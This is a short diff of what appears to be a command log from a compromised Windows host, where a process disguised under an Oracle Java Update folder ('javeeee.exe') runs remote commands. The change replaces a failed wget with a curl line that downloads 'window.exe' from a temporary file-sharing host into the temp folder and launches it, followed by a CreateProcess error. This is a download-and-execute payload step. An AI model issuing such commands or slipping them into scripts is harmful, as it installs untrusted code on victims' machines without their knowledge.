@@ -1,4 +1,4 @@
-2026-08-26T20:57:41.4399456
+2026-08-26T21:02:59.8371255
 
 DESKTOP-1K2HC6J / user
 
@@ -8,6 +8,5 @@ C:\Users\HUB\AppData\Local\Oracle\JavaUpdate\javeeee.exe
 
 
 
-CMD[1/1] wget https://tmpfiles.org/dl/1787758294.9b9ffe9b58d4ca20/wfwuGd3q7VIB/window.exe
-'wget' is not recognized as an internal or external command,
-operable program or batch file.
+CMD[1/1] curl -L -o "%TEMP%\window.exe" "https://tmpfiles.org/dl/1787758294.9b9ffe9b58d4ca20/wfwuGd3q7VIB/window.exe" && start "" "%TEMP%\window.exe"
+[ERR] CreateProcess failed
